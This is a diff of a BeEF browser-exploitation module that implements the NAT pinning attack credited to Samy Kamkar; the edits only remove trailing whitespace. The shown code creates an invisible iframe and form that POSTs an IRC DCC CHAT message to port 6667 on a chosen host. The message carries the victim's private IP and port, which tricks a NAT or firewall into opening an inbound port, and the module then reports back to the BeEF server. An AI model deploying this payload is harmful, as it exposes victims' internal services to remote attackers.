@@ -13,18 +13,18 @@ beef.execute(function() {
     var d = dot.split('.');
     return (((+d[0])*256+(+d[1]))*256+(+d[2]))*256+(+d[3]);
   }
-    
+
   var myIframe = beef.dom.createInvisibleIframe();
   var myForm = document.createElement("form");
   var action = "http://" + connectto + ":6667/"
- 
+
   myForm.setAttribute("name", "data");
   myForm.setAttribute("method", "post");
   //it must be multipart/form-data so the message appears on separate line
   myForm.setAttribute("enctype", "multipart/form-data");
   myForm.setAttribute("action", action);
 
-    
+
   //create message, refer Samy Kamkar (http://samy.pl/natpin/)
   x = String.fromCharCode(1);
   var s = 'PRIVMSG beef :'+x+'DCC CHAT beef '+dot2dec(privateip)+' '+privateport+x+"\n";
@@ -38,8 +38,8 @@ beef.execute(function() {
 
   //send message
   myIframe.contentWindow.document.getElementById("msg_<%= @command_id %>").value = s;
-  myForm.submit(); 
-    
+  myForm.submit();
+
   beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Message sent');
 
 });
